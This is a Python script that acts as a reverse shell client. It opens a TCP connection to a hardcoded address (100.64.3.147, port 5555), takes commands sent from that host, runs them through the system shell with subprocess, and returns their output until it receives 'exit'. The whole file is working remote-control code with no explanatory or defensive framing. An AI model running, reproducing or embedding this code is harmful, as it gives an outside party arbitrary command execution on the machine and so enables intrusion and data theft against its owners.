import socket
import subprocess

# Define the server's IP address and port
server_ip = "100.64.3.147" 
port = 5555

# Connect to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, port))

try:
    while True:
        # Receive a command from the server
        command = client_socket.recv(4096).decode('utf-8')

        if command.lower() == "exit":
            break

        try:
            # Execute the received command on the client
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output = result.stdout + result.stderr
            client_socket.send(output.encode('utf-8'))
        except Exception as e:
            client_socket.send(str(e).encode('utf-8'))
except KeyboardInterrupt:
    pass

# Close the client socket
client_socket.close()
